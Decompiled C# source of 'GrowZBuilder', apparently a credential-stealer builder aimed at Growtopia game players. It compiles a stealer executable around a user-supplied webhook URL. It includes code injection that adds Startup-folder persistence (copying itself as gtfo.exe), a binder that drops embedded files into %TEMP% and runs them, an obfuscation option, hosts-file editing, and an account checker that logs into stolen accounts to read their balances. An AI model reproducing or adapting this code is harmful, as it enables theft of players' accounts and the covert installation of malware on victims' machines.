// Decompiled with JetBrains decompiler
// Type: WebhookStealer.Form1
// Assembly: GrowZBuilder, Version=5.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: D7E1FA2E-5F50-41A6-84C5-F3758C34FFF5
// Assembly location: C:\Users\kol\Desktop\Naujas aplankas (6)\GrowzBuilder\Uusi kansio (2)\GrowZBuilder.exe

using ENet.Managed;
using MetroFramework;
using MetroFramework.Controls;
using MetroFramework.Forms;
using System;
using System.CodeDom.Compiler;
using System.Collections;
using System.Collections.Generic;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Net;
using System.Runtime.InteropServices;
using System.Text;
using System.Text.RegularExpressions;
using System.Threading;
using System.Windows.Forms;
using WebhookStealer.Properties;

namespace WebhookStealer
{
  public class Form1 : MetroForm
  {
    private ENetHost eNet;
    private ENetPeer eNetP;
    public int Growtopia_Port = 17279;
    public string Growtopia_IP = "213.179.209.168";
    public string Growtopia_Master_IP = "213.179.209.168";
    public int Growtopia_Master_Port = 17279;
    public static string doorid = "";
    public static string tankIDName = "";
    public static string tankIDPass = "";
    public static string game_version = "3.38";
    public static string country = "us";
    private static Random aa = new Random();
    private static string randomismi = Form1.aa.Next(10, 99).ToString();
    private static string randomismi1 = Form1.aa.Next(10, 99).ToString();
    private static string randomismi2 = Form1.aa.Next(10, 99).ToString();
    private static string randomismi3 = Form1.aa.Next(10, 99).ToString();
    private static string randomismi4 = Form1.aa.Next(10, 99).ToString();
    public static string maccz = "02:" + Form1.randomismi1 + ":" + Form1.randomismi2 + ":" + Form1.randomismi3 + ":" + Form1.randomismi4 + ":" + Form1.randomismi;
    public static string macc = "02:00:00:00:00:00";
    public static int token = 0;
    public static bool resetStuffNextLogon = false;
    public static int userID = 0;
    public static int lmode = 0;
    private static string yeterfuck;
    private static string nopefuck;
    private IContainer components;
    private MetroTextBox txtwebhook;
    private Label label1;
    private MetroCheckBox iconcheck;
    private MetroTextBox icontxt;
    private MetroButton iconbutton;
    private MetroButton compilebtn;
    private Label label2;
    private PictureBox pictureBox1;
    private MetroCheckBox checkstart;
    private MetroTabControl tabcontrol;
    private MetroTabPage mainpage;
    private MetroTabPage bindpage;
    private MetroButton metroButton2;
    private MetroButton metroButton1;
    private ListView listView1;
    private ColumnHeader columnHeader1;
    private MetroCheckBox metroCheckBox2;
    private MetroCheckBox metroCheckBox1;
    private WebBrowser webBrowser1;
    private MetroTabPage morepage;
    private MetroTabPage aboutpage;
    private MetroButton metroButton6;
    private MetroButton metroButton5;
    private MetroButton metroButton4;
    private MetroButton metroButton3;
    private MetroTextBox hosts;
    private Label label3;
    private PictureBox pictureBox2;
    private MetroCheckBox metroCheckBox3;
    private MetroTabPage accountchecker;
    private Label label5;
    private Label label4;
    private MetroButton metroButton7;
    private MetroTextBox animaTextBox4;
    private MetroTextBox animaTextBox3;
    private ListView listView2;
    private ColumnHeader columnHeader2;
    private ColumnHeader columnHeader3;
    private ColumnHeader columnHeader4;
    private ColumnHeader columnHeader5;
    private MetroLabel status;
    private PictureBox pictureBox3;
    private Label label7;
    private Label label6;

    private void Peer_OnDisconnect_Client(object sender, uint e)
    {
      try
      {
        Form1.yeterfuck = System.IO.File.ReadAllText("s.temp");
        Form1.nopefuck = System.IO.File.ReadAllText("d.temp");
        ListViewItem listViewItem = new ListViewItem(this.animaTextBox4.Text);
        listViewItem.SubItems.Add(this.animaTextBox3.Text);
        string[] strArray1 = Form1.yeterfuck.Split('\n');
        string[] strArray2 = Form1.nopefuck.Split('\n');
        try
        {
          for (int index = 0; index < strArray1.Length; ++index)
          {
            if (strArray1[index].Contains("Worldlock"))
              listViewItem.SubItems.Add(strArray1[index].ToLower().Replace("worldlock_balance|", ""));
          }
          for (int index = 0; index < strArray2.Length; ++index)
          {
            if (strArray2[index].Contains("Gems"))
              listViewItem.SubItems.Add(strArray2[index].ToLower().Replace("gems_balance|", ""));
          }
          this.status.Text = "Checked Success!";
          this.listView2.Items.Add(listViewItem);
          System.IO.File.Delete("d.temp");
          System.IO.File.Delete("s.temp");
        }
        catch
        {
        }
      }
      catch
      {
      }
    }

   

    public static string CreateLogonPacket(string customGrowID = "", string customPass = "")
    {
      string str1 = string.Empty;
      Random random = new Random();
      bool flag = false;
      if (Form1.token > 0 || Form1.token < 0)
        flag = true;
      if (customGrowID == "")
      {
        if (Form1.tankIDName != "")
          str1 = str1 + "tankIDName|" + Form1.tankIDName + "\n" + "tankIDPass|" + Form1.tankIDPass + "\n";
      }
      else
        str1 = str1 + "tankIDName|" + customGrowID + "\n" + "tankIDPass|" + customPass + "\n";
      string str2 = str1 + "requestedName|Growbrew" + random.Next(0, (int) byte.MaxValue).ToString() + "\n" + "f|1\n" + "protocol|94\n" + "game_version|" + Form1.game_version + "\n";
      if (flag)
        str2 = str2 + "lmode|" + Form1.lmode.ToString() + "\n";
      string str3 = str2 + "cbits|0\n" + "player_age|100\n" + "GDPR|1\n" + "hash2|" + random.Next(-777777777, 777777777).ToString() + "\n" + "meta|localhost\n" + "fhash|-716928004\n" + "platformID|4\n" + "deviceVersion|0\n" + "country|" + Form1.country + "\n" + "hash|" + random.Next(-777777777, 777777777).ToString() + "\n" + "mac|" + Form1.macc + "\n";
      if (flag)
        str3 = str3 + "user|" + Form1.userID.ToString() + "\n";
      if (flag)
        str3 = str3 + "token|" + Form1.token.ToString() + "\n";
      if (Form1.doorid != "")
        str3 = str3 + "doorID|" + Form1.doorid.ToString() + "\n";
      return str3 + "wk|NONE0\n";
    }

   
  


    public Form1() => this.InitializeComponent();

    private void iconcheck_CheckedChanged(object sender, EventArgs e)
    {
      if (this.iconcheck.Checked)
      {
        this.icontxt.Visible = true;
        this.iconbutton.Visible = true;
      }
      if (this.iconcheck.Checked)
        return;
      this.icontxt.Visible = false;
      this.iconbutton.Visible = false;
    }

    public string ProcessStealer(string code)
    {
      string str1 = code;
      if (this.checkstart.Checked)
        str1 = str1.Replace("//startup", " File.Copy(Assembly.GetExecutingAssembly().Location, Environment.GetFolderPath(Environment.SpecialFolder.Startup) + \"\\\\gtfo.exe\", true);");
      if (this.listView1.Items.Count > 0)
      {
        string str2 = " static void ugaylmao()\r\n        {\r\n            string copytothis = Environment.ExpandEnvironmentVariables(\"%TEMP%\");\r\n            //turnon\r\n        }\r\n        private static void Extract(string resource, string path)\r\n\t\t{\r\n\t\t\tusing (var assemblystream = Assembly.GetExecutingAssembly().GetManifestResourceStream(resource))\r\n            {\r\n\t\t\t\tusing(var fileStream = new FileStream(path + \"\\\\\" + resource, FileMode.Create,FileAccess.Write))\r\n                {\r\n                    assemblystream.CopyTo(fileStream);\r\n                    Process.Start(path + \"\\\\\" + resource);\r\n                }\r\n            }\r\n        }";
        int startIndex = str2.IndexOf("//turnon");
        string newValue = str2;
        foreach (ListViewItem listViewItem in this.listView1.Items)
          newValue = newValue.Insert(startIndex, Environment.NewLine + "Extract(\"" + Path.GetFileName(listViewItem.SubItems[0].Text) + "\", copytothis);");
        str1 = str1.Replace("//extractvoid", newValue).Replace("//turnonfreal", "if(System.Reflection.Assembly.GetEntryAssembly().Location != Environment.ExpandEnvironmentVariables(\"%TEMP%\") + @\"\\\" + Path.GetFileName(System.Reflection.Assembly.GetEntryAssembly().Location)){ugaylmao();}");
      }
      return str1;
    }

    private void iconbutton_Click(object sender, EventArgs e)
    {
      OpenFileDialog openFileDialog = new OpenFileDialog();
      openFileDialog.Title = "Find your icon.";
      openFileDialog.FileName = "";
      openFileDialog.Filter = "Icon files(*.ico)|*.ico";
      int num = (int) openFileDialog.ShowDialog();
      if (openFileDialog.FileName == "" || openFileDialog.FileName == " ")
        return;
      this.icontxt.Text = openFileDialog.FileName;
      this.pictureBox1.Image = (Image) Bitmap.FromHicon(new Icon(openFileDialog.FileName, new Size(48, 48)).Handle);
    }

    private void compilebtn_Click(object sender, EventArgs e)
    {
      SaveFileDialog saveFileDialog = new SaveFileDialog();
      saveFileDialog.Title = "Save your stealer.";
      saveFileDialog.FileName = "";
      saveFileDialog.Filter = "Executable files(*.exe)|*.exe";
      int num1 = (int) saveFileDialog.ShowDialog();
      if (saveFileDialog.FileName == "" || saveFileDialog.FileName == " ")
      {
        int num2 = (int) MessageBox.Show("Invalid path", "Invalid path", MessageBoxButtons.OK, MessageBoxIcon.Hand);
      }
      else
      {
        string fileName = saveFileDialog.FileName;
        string text = this.txtwebhook.Text;
        string str = this.ProcessStealer(Resources.Code);
        CodeDomProvider provider = CodeDomProvider.CreateProvider("CSharp");
        CompilerParameters options = new CompilerParameters();
        options.ReferencedAssemblies.Add("System.Net.dll");
        options.ReferencedAssemblies.Add("System.dll");
        options.ReferencedAssemblies.Add("System.Collections.Specialized.dll");
        options.ReferencedAssemblies.Add("System.Runtime.InteropServices.dll");
        options.ReferencedAssemblies.Add("System.IO.dll");
        options.ReferencedAssemblies.Add("System.Reflection.dll");
        options.GenerateExecutable = true;
        options.OutputAssembly = fileName;
        options.GenerateInMemory = false;
        options.TreatWarningsAsErrors = false;
        if (this.iconcheck.Checked)
        {
          CompilerParameters compilerParameters = options;
          compilerParameters.CompilerOptions = compilerParameters.CompilerOptions + " /win32icon:\"" + this.icontxt.Text + "\"";
        }
        if (this.listView1.Items.Count > 0)
        {
          foreach (ListViewItem listViewItem in this.listView1.Items)
            options.EmbeddedResources.Add(listViewItem.SubItems[0].Text ?? "");
        }
        CompilerResults compilerResults = provider.CompileAssemblyFromSource(options, str.Replace("**WEBHOOK**", text));
        if (compilerResults.Errors.Count > 0)
        {
          foreach (CompilerError error in (CollectionBase) compilerResults.Errors)
          {
            int num3 = (int) MessageBox.Show(error.ToString(), "Error");
          }
        }
        else
        {
          int num4 = (int) MessageBox.Show("Done!!", "Sucess!", MessageBoxButtons.OK, MessageBoxIcon.Asterisk);
        }
      }
    }

    private void metroButton1_Click(object sender, EventArgs e)
    {
      OpenFileDialog openFileDialog = new OpenFileDialog();
      openFileDialog.Title = "Find your file.";
      openFileDialog.Filter = "Text files (*.txt)|*.txt|Image files(*.ai, *.bmp, *.gif, *.ico, *.jpeg, *.jpg, *.png, *.ps, *.psd, *.svg, *.tif, *.tiff)|*.ai; *.bmp; *.gif; *.ico; *.jpeg; *.jpg; *.png; *.ps; *.psd; *.svg; *.tif; *.tiff;|Rar,zip...(*.7z,*.pkg,*.rar,*.zip,*.z,*.tar.gz,*.rpm)|*.7z;*.pkg;*.rar;*.zip;*.z;*.tar.gz;*.rpm;|Word,Presentation,...(*.doc,*.docx,*.pdf,*.wpd,*.xls,*.xlsm,*.xlsx,*.ppt,*.pps,*.pptx)|*.doc;*.docx;*.pdf;*.wpd;*.xls;*.xlsm;*.xlsx;*.ppt;*.pps;*.pptx;|Executable files(*.bat, *.exe, *.jar, *.msi, *.dll, *.py, *.wsf, *.bin, *.bat)|*.bat; *.exe; *.jar; *.msi; *.dll; *.py; *.wsf; *.bin; *.bat;|Video file(*.avi, *.flv, *.m4v, *.mkv, *.mov, *.mp4, *.mpg, *.mpeg, *.vob, *.wmv, *.swf)|*.avi; *.flv; *.m4v; *.mkv; *.mov; *.mp4; *.mpg; *.mpeg; *.vob; *.wmv; *.swf;|Audio file(*.aif, *.cda, *.mid, *.midi, *.mp3, *.mpa, *.wav, *.wma, *.wpl)|*.aif; *.cda; *.mid; *.midi; *.mp3; *.mpa; *.wav; *.wma; *.wpl;|All files (*.*)|*.*;";
      openFileDialog.FileName = "Binded File";
      if (openFileDialog.ShowDialog() != DialogResult.OK)
        return;
      foreach (string fileName in openFileDialog.FileNames)
        this.listView1.Items.Add(new ListViewItem(openFileDialog.FileNames));
    }

    private void metroButton2_Click(object sender, EventArgs e)
    {
      if (this.listView1.Items.Count <= 0)
        return;
      this.listView1.Items.Remove(this.listView1.SelectedItems[0]);
    }

    private void listView1_SelectedIndexChanged(object sender, EventArgs e)
    {
    }

    private void listView1_SelectedIndexChanged_1(object sender, EventArgs e)
    {
    }

    private void checkstart_CheckedChanged(object sender, EventArgs e)
    {
      if (!this.checkstart.Checked)
        return;
      int num1 = (int) MessageBox.Show("Install CheatEngine or else builder wont open!");
      int num2 = (int) MessageBox.Show(".CETRAINER Builder made by Dream Haxor");
      Process.Start(Environment.GetFolderPath(Environment.SpecialFolder.UserProfile) + "\\Desktop\\GrowZBuilder\\include\\Builder.CETRAINER");
    }

    private void metroButton4_Click(object sender, EventArgs e)
    {
      foreach (Process process in Process.GetProcessesByName("Proxy"))
        process.Kill();
    }

    private void metroButton3_Click(object sender, EventArgs e) => Process.Start(Environment.GetFolderPath(Environment.SpecialFolder.UserProfile) + "\\Desktop\\GrowZBuilder\\include\\Proxy.exe");

    private void metroButton5_Click(object sender, EventArgs e) => this.hosts.Text = System.IO.File.ReadAllText("C:\\Windows\\System32\\drivers\\etc\\hosts");

    private void metroButton6_Click(object sender, EventArgs e)
    {
      System.IO.File.WriteAllText("C:\\Windows\\System32\\drivers\\etc\\hosts", this.hosts.Text);
      int num = (int) MessageBox.Show("Succesfully Added!");
    }

    private void pictureBox2_Click(object sender, EventArgs e) => Process.Start("https://www.youtube.com/channel/UC8WyYmPAinahharsMxse5Vw?view_as=subscriber");

    private void metroCheckBox3_CheckedChanged(object sender, EventArgs e)
    {
    }

    private void Form1_Load(object sender, EventArgs e)
    {
    }

  

    protected override void Dispose(bool disposing)
    {
      if (disposing && this.components != null)
        this.components.Dispose();
      base.Dispose(disposing);
    }

    private void InitializeComponent()
    {
      ComponentResourceManager componentResourceManager = new ComponentResourceManager(typeof (Form1));
      this.txtwebhook = new MetroTextBox();
      this.label1 = new Label();
      this.iconcheck = new MetroCheckBox();
      this.icontxt = new MetroTextBox();
      this.iconbutton = new MetroButton();
      this.compilebtn = new MetroButton();
      this.label2 = new Label();
      this.pictureBox1 = new PictureBox();
      this.checkstart = new MetroCheckBox();
      this.tabcontrol = new MetroTabControl();
      this.mainpage = new MetroTabPage();
      this.metroCheckBox3 = new MetroCheckBox();
      this.metroCheckBox2 = new MetroCheckBox();
      this.bindpage = new MetroTabPage();
      this.metroCheckBox1 = new MetroCheckBox();
      this.listView1 = new ListView();
      this.columnHeader1 = new ColumnHeader();
      this.metroButton2 = new MetroButton();
      this.metroButton1 = new MetroButton();

      this.webBrowser1 = new WebBrowser();
      this.morepage = new MetroTabPage();
      this.metroButton6 = new MetroButton();
      this.metroButton5 = new MetroButton();
      this.metroButton4 = new MetroButton();
      this.metroButton3 = new MetroButton();
      this.hosts = new MetroTextBox();
      this.aboutpage = new MetroTabPage();
      this.pictureBox2 = new PictureBox();
      this.label3 = new Label();
      this.accountchecker = new MetroTabPage();
      this.listView2 = new ListView();
      this.columnHeader2 = new ColumnHeader();
      this.columnHeader3 = new ColumnHeader();
      this.columnHeader4 = new ColumnHeader();
      this.columnHeader5 = new ColumnHeader();
      this.metroButton7 = new MetroButton();
      this.animaTextBox4 = new MetroTextBox();
      this.animaTextBox3 = new MetroTextBox();
      this.label4 = new Label();
      this.label5 = new Label();
      this.status = new MetroLabel();
      this.pictureBox3 = new PictureBox();
      this.label6 = new Label();
      this.label7 = new Label();
      ((ISupportInitialize) this.pictureBox1).BeginInit();
      this.tabcontrol.SuspendLayout();
      this.mainpage.SuspendLayout();
      this.bindpage.SuspendLayout();
      this.morepage.SuspendLayout();
      this.aboutpage.SuspendLayout();
      ((ISupportInitialize) this.pictureBox2).BeginInit();
      this.accountchecker.SuspendLayout();
      ((ISupportInitialize) this.pictureBox3).BeginInit();
      this.SuspendLayout();
      this.txtwebhook.CustomButton.Image = (Image) null;
      this.txtwebhook.CustomButton.Location = new Point(445, 1);
      this.txtwebhook.CustomButton.Margin = new Padding(1);
      this.txtwebhook.CustomButton.Name = "";
      this.txtwebhook.CustomButton.Size = new Size(19, 19);
      this.txtwebhook.CustomButton.Style = MetroColorStyle.Blue;
      this.txtwebhook.CustomButton.TabIndex = 1;
      this.txtwebhook.CustomButton.Theme = MetroThemeStyle.Light;
      this.txtwebhook.CustomButton.UseSelectable = true;
      this.txtwebhook.CustomButton.Visible = false;
      this.txtwebhook.Lines = new string[0];
      this.txtwebhook.Location = new Point(5, 34);
      this.txtwebhook.Margin = new Padding(2);
      this.txtwebhook.MaxLength = (int) short.MaxValue;
      this.txtwebhook.Multiline = true;
      this.txtwebhook.Name = "txtwebhook";
      this.txtwebhook.PasswordChar = char.MinValue;
      this.txtwebhook.ScrollBars = ScrollBars.None;
      this.txtwebhook.SelectedText = "";
      this.txtwebhook.SelectionLength = 0;
      this.txtwebhook.SelectionStart = 0;
      this.txtwebhook.ShortcutsEnabled = true;
      this.txtwebhook.Size = new Size(465, 21);
      this.txtwebhook.Style = MetroColorStyle.Red;
      this.txtwebhook.TabIndex = 0;
      this.txtwebhook.Theme = MetroThemeStyle.Dark;
      this.txtwebhook.UseSelectable = true;
      this.txtwebhook.WaterMarkColor = Color.FromArgb(109, 109, 109);
      this.txtwebhook.WaterMarkFont = new Font("Segoe UI", 12f, FontStyle.Italic, GraphicsUnit.Pixel);
      this.label1.AutoSize = true;
      this.label1.BackColor = Color.Transparent;
      this.label1.Font = new Font("Arial", 12f, FontStyle.Regular, GraphicsUnit.Point, (byte) 0);
      this.label1.ForeColor = SystemColors.ButtonHighlight;
      this.label1.Location = new Point(2, 11);
      this.label1.Margin = new Padding(2, 0, 2, 0);
      this.label1.Name = "label1";
      this.label1.Size = new Size(114, 18);
      this.label1.TabIndex = 1;
      this.label1.Text = "Webhook URL:";
      this.iconcheck.AutoSize = true;
      this.iconcheck.FontSize = MetroCheckBoxSize.Medium;
      this.iconcheck.Location = new Point(5, 59);
      this.iconcheck.Margin = new Padding(2);
      this.iconcheck.Name = "iconcheck";
      this.iconcheck.Size = new Size(51, 19);
      this.iconcheck.Style = MetroColorStyle.Red;
      this.iconcheck.TabIndex = 2;
      this.iconcheck.Text = "Icon";
      this.iconcheck.Theme = MetroThemeStyle.Dark;
      this.iconcheck.UseSelectable = true;
      this.iconcheck.CheckedChanged += new EventHandler(this.iconcheck_CheckedChanged);
      this.icontxt.CustomButton.Image = (Image) null;
      this.icontxt.CustomButton.Location = new Point(247, 2);
      this.icontxt.CustomButton.Margin = new Padding(1);
      this.icontxt.CustomButton.Name = "";
      this.icontxt.CustomButton.Size = new Size(13, 13);
      this.icontxt.CustomButton.Style = MetroColorStyle.Blue;
      this.icontxt.CustomButton.TabIndex = 1;
      this.icontxt.CustomButton.Theme = MetroThemeStyle.Light;
      this.icontxt.CustomButton.UseSelectable = true;
      this.icontxt.CustomButton.Visible = false;
      this.icontxt.Lines = new string[0];
      this.icontxt.Location = new Point(60, 61);
      this.icontxt.Margin = new Padding(2);
      this.icontxt.MaxLength = (int) short.MaxValue;
      this.icontxt.Multiline = true;
      this.icontxt.Name = "icontxt";
      this.icontxt.PasswordChar = char.MinValue;
      this.icontxt.ScrollBars = ScrollBars.None;
      this.icontxt.SelectedText = "";
      this.icontxt.SelectionLength = 0;
      this.icontxt.SelectionStart = 0;
      this.icontxt.ShortcutsEnabled = true;
      this.icontxt.Size = new Size(263, 18);
      this.icontxt.Style = MetroColorStyle.Red;
      this.icontxt.TabIndex = 3;
      this.icontxt.Theme = MetroThemeStyle.Dark;
      this.icontxt.UseSelectable = true;
      this.icontxt.Visible = false;
      this.icontxt.WaterMarkColor = Color.FromArgb(109, 109, 109);
      this.icontxt.WaterMarkFont = new Font("Segoe UI", 12f, FontStyle.Italic, GraphicsUnit.Pixel);
      this.iconbutton.Location = new Point(324, 61);
      this.iconbutton.Margin = new Padding(2);
      this.iconbutton.Name = "iconbutton";
      this.iconbutton.Size = new Size(24, 18);
      this.iconbutton.Style = MetroColorStyle.Red;
      this.iconbutton.TabIndex = 4;
      this.iconbutton.Text = "...";
      this.iconbutton.Theme = MetroThemeStyle.Dark;
      this.iconbutton.UseSelectable = true;
      this.iconbutton.Visible = false;
      this.iconbutton.Click += new EventHandler(this.iconbutton_Click);
      this.compilebtn.Location = new Point(352, 61);
      this.compilebtn.Margin = new Padding(2);
      this.compilebtn.Name = "compilebtn";
      this.compilebtn.Size = new Size(117, 150);
      this.compilebtn.Style = MetroColorStyle.Red;
      this.compilebtn.TabIndex = 5;
      this.compilebtn.Text = "Build!";
      this.compilebtn.Theme = MetroThemeStyle.Dark;
      this.compilebtn.UseSelectable = true;
      this.compilebtn.Click += new EventHandler(this.compilebtn_Click);
      this.label2.AutoSize = true;
      this.label2.BackColor = Color.Transparent;
      this.label2.Font = new Font("Microsoft Sans Serif", 11f, FontStyle.Regular, GraphicsUnit.Point, (byte) 238);
      this.label2.ForeColor = SystemColors.ButtonHighlight;
      this.label2.Location = new Point(2, 85);
      this.label2.Margin = new Padding(2, 0, 2, 0);
      this.label2.Name = "label2";
      this.label2.Size = new Size(96, 18);
      this.label2.TabIndex = 6;
      this.label2.Text = "Icon Preview:";
      this.pictureBox1.BackColor = Color.Transparent;
      this.pictureBox1.Image = (Image) Resources.photo;
      this.pictureBox1.Location = new Point(4, 108);
      this.pictureBox1.Margin = new Padding(2);
      this.pictureBox1.Name = "pictureBox1";
      this.pictureBox1.Size = new Size(98, 103);
      this.pictureBox1.SizeMode = PictureBoxSizeMode.StretchImage;
      this.pictureBox1.TabIndex = 7;
      this.pictureBox1.TabStop = false;
      this.checkstart.AutoSize = true;
      this.checkstart.FontSize = MetroCheckBoxSize.Medium;
      this.checkstart.Location = new Point(106, 131);
      this.checkstart.Margin = new Padding(2);
      this.checkstart.Name = "checkstart";
      this.checkstart.Size = new Size(97, 19);
      this.checkstart.Style = MetroColorStyle.Red;
      this.checkstart.TabIndex = 8;
      this.checkstart.Text = ".CETRAINER";
      this.checkstart.Theme = MetroThemeStyle.Dark;
      this.checkstart.UseSelectable = true;
      this.checkstart.CheckedChanged += new EventHandler(this.checkstart_CheckedChanged);
      this.tabcontrol.Controls.Add((Control) this.mainpage);
      this.tabcontrol.Controls.Add((Control) this.accountchecker);
      this.tabcontrol.Controls.Add((Control) this.bindpage);
      this.tabcontrol.Controls.Add((Control) this.morepage);
      this.tabcontrol.Controls.Add((Control) this.aboutpage);
      this.tabcontrol.Location = new Point(13, 59);
      this.tabcontrol.Margin = new Padding(2);
      this.tabcontrol.Name = "tabcontrol";
      this.tabcontrol.SelectedIndex = 0;
      this.tabcontrol.Size = new Size(482, (int) byte.MaxValue);
      this.tabcontrol.Style = MetroColorStyle.Red;
      this.tabcontrol.TabIndex = 9;
      this.tabcontrol.Theme = MetroThemeStyle.Dark;
      this.tabcontrol.UseSelectable = true;
      this.mainpage.Controls.Add((Control) this.metroCheckBox3);
      this.mainpage.Controls.Add((Control) this.metroCheckBox2);
      this.mainpage.Controls.Add((Control) this.checkstart);
      this.mainpage.Controls.Add((Control) this.compilebtn);
      this.mainpage.Controls.Add((Control) this.iconcheck);
      this.mainpage.Controls.Add((Control) this.txtwebhook);
      this.mainpage.Controls.Add((Control) this.label1);
      this.mainpage.Controls.Add((Control) this.icontxt);
      this.mainpage.Controls.Add((Control) this.iconbutton);
      this.mainpage.Controls.Add((Control) this.label2);
      this.mainpage.Controls.Add((Control) this.pictureBox1);
      this.mainpage.HorizontalScrollbarBarColor = true;
      this.mainpage.HorizontalScrollbarHighlightOnWheel = false;
      this.mainpage.HorizontalScrollbarSize = 6;
      this.mainpage.Location = new Point(4, 38);
      this.mainpage.Margin = new Padding(2);
      this.mainpage.Name = "mainpage";
      this.mainpage.Size = new Size(474, 213);
      this.mainpage.Style = MetroColorStyle.Red;
      this.mainpage.TabIndex = 0;
      this.mainpage.Text = "Builder";
      this.mainpage.Theme = MetroThemeStyle.Dark;
      this.mainpage.VerticalScrollbarBarColor = true;
      this.mainpage.VerticalScrollbarHighlightOnWheel = false;
      this.mainpage.VerticalScrollbarSize = 7;
      this.metroCheckBox3.AutoSize = true;
      this.metroCheckBox3.Checked = true;
      this.metroCheckBox3.CheckState = CheckState.Checked;
      this.metroCheckBox3.FontSize = MetroCheckBoxSize.Medium;
      this.metroCheckBox3.Location = new Point(106, 154);
      this.metroCheckBox3.Margin = new Padding(2);
      this.metroCheckBox3.Name = "metroCheckBox3";
      this.metroCheckBox3.Size = new Size(87, 19);
      this.metroCheckBox3.Style = MetroColorStyle.Red;
      this.metroCheckBox3.TabIndex = 10;
      this.metroCheckBox3.Text = "Obfuscate";
      this.metroCheckBox3.Theme = MetroThemeStyle.Dark;
      this.metroCheckBox3.UseSelectable = true;
      this.metroCheckBox3.CheckedChanged += new EventHandler(this.metroCheckBox3_CheckedChanged);
      this.metroCheckBox2.AutoSize = true;
      this.metroCheckBox2.FontSize = MetroCheckBoxSize.Medium;
      this.metroCheckBox2.Location = new Point(106, 108);
      this.metroCheckBox2.Margin = new Padding(2);
      this.metroCheckBox2.Name = "metroCheckBox2";
      this.metroCheckBox2.Size = new Size(137, 19);
      this.metroCheckBox2.Style = MetroColorStyle.Red;
      this.metroCheckBox2.TabIndex = 9;
      this.metroCheckBox2.Text = "Turn on at startup";
      this.metroCheckBox2.Theme = MetroThemeStyle.Dark;
      this.metroCheckBox2.UseSelectable = true;
      this.bindpage.BackColor = SystemColors.Control;
      this.bindpage.Controls.Add((Control) this.metroCheckBox1);
      this.bindpage.Controls.Add((Control) this.listView1);
      this.bindpage.Controls.Add((Control) this.metroButton2);
      this.bindpage.Controls.Add((Control) this.metroButton1);
      this.bindpage.HorizontalScrollbarBarColor = true;
      this.bindpage.HorizontalScrollbarHighlightOnWheel = false;
      this.bindpage.HorizontalScrollbarSize = 6;
      this.bindpage.Location = new Point(4, 38);
      this.bindpage.Margin = new Padding(2);
      this.bindpage.Name = "bindpage";
      this.bindpage.Size = new Size(474, 213);
      this.bindpage.Style = MetroColorStyle.Red;
      this.bindpage.TabIndex = 1;
      this.bindpage.Text = "Binder";
      this.bindpage.Theme = MetroThemeStyle.Dark;
      this.bindpage.VerticalScrollbarBarColor = true;
      this.bindpage.VerticalScrollbarHighlightOnWheel = false;
      this.bindpage.VerticalScrollbarSize = 7;
      this.metroCheckBox1.AutoSize = true;
      this.metroCheckBox1.FontSize = MetroCheckBoxSize.Medium;
      this.metroCheckBox1.Location = new Point(139, 184);
      this.metroCheckBox1.Margin = new Padding(2);
      this.metroCheckBox1.Name = "metroCheckBox1";
      this.metroCheckBox1.Size = new Size(129, 19);
      this.metroCheckBox1.Style = MetroColorStyle.Red;
      this.metroCheckBox1.TabIndex = 9;
      this.metroCheckBox1.Text = "Hide Binded Files";
      this.metroCheckBox1.Theme = MetroThemeStyle.Dark;
      this.metroCheckBox1.UseSelectable = true;
      this.listView1.AllowDrop = true;
      this.listView1.BackColor = Color.Black;
      this.listView1.Columns.AddRange(new ColumnHeader[1]
      {
        this.columnHeader1
      });
      this.listView1.Font = new Font("Microsoft Sans Serif", 8.25f, FontStyle.Bold, GraphicsUnit.Point, (byte) 0);
      this.listView1.ForeColor = SystemColors.ButtonHighlight;
      this.listView1.FullRowSelect = true;
      this.listView1.HideSelection = false;
      this.listView1.Location = new Point(0, 16);
      this.listView1.Margin = new Padding(4, 5, 4, 5);
      this.listView1.MultiSelect = false;
      this.listView1.Name = "listView1";
      this.listView1.Size = new Size(478, 161);
      this.listView1.TabIndex = 8;
      this.listView1.UseCompatibleStateImageBehavior = false;
      this.listView1.View = View.Details;
      this.listView1.SelectedIndexChanged += new EventHandler(this.listView1_SelectedIndexChanged_1);
      this.columnHeader1.Text = "File";
      this.columnHeader1.Width = 555;
      this.metroButton2.Location = new Point(356, 181);
      this.metroButton2.Margin = new Padding(2);
      this.metroButton2.Name = "metroButton2";
      this.metroButton2.Size = new Size(117, 29);
      this.metroButton2.Style = MetroColorStyle.Red;
      this.metroButton2.TabIndex = 7;
      this.metroButton2.Text = "Remove";
      this.metroButton2.Theme = MetroThemeStyle.Dark;
      this.metroButton2.UseSelectable = true;
      this.metroButton2.Click += new EventHandler(this.metroButton2_Click);
      this.metroButton1.Location = new Point(0, 181);
      this.metroButton1.Margin = new Padding(2);
      this.metroButton1.Name = "metroButton1";
      this.metroButton1.Size = new Size(117, 29);
      this.metroButton1.Style = MetroColorStyle.Red;
      this.metroButton1.TabIndex = 6;
      this.metroButton1.Text = "Add";
      this.metroButton1.Theme = MetroThemeStyle.Dark;
      this.metroButton1.UseSelectable = true;
      this.metroButton1.Click += new EventHandler(this.metroButton1_Click);
      this.morepage.Controls.Add((Control) this.metroButton6);
      this.morepage.Controls.Add((Control) this.metroButton5);
      this.morepage.Controls.Add((Control) this.metroButton4);
      this.morepage.Controls.Add((Control) this.metroButton3);
      this.morepage.Controls.Add((Control) this.hosts);
      this.morepage.HorizontalScrollbarBarColor = true;
      this.morepage.HorizontalScrollbarHighlightOnWheel = false;
      this.morepage.HorizontalScrollbarSize = 10;
      this.morepage.Location = new Point(4, 38);
      this.morepage.Name = "morepage";
      this.morepage.Size = new Size(474, 213);
      this.morepage.TabIndex = 3;
      this.morepage.Text = "More+";
      this.morepage.Theme = MetroThemeStyle.Dark;
      this.morepage.VerticalScrollbarBarColor = true;
      this.morepage.VerticalScrollbarHighlightOnWheel = false;
      this.morepage.VerticalScrollbarSize = 10;
      this.metroButton6.Location = new Point(307, 171);
      this.metroButton6.Margin = new Padding(2);
      this.metroButton6.Name = "metroButton6";
      this.metroButton6.Size = new Size(162, 40);
      this.metroButton6.Style = MetroColorStyle.Red;
      this.metroButton6.TabIndex = 9;
      this.metroButton6.Text = "Add to Hosts";
      this.metroButton6.Theme = MetroThemeStyle.Dark;
      this.metroButton6.UseSelectable = true;
      this.metroButton6.Click += new EventHandler(this.metroButton6_Click);
      this.metroButton5.Location = new Point(307, 128);
      this.metroButton5.Margin = new Padding(2);
      this.metroButton5.Name = "metroButton5";
      this.metroButton5.Size = new Size(162, 40);
      this.metroButton5.Style = MetroColorStyle.Red;
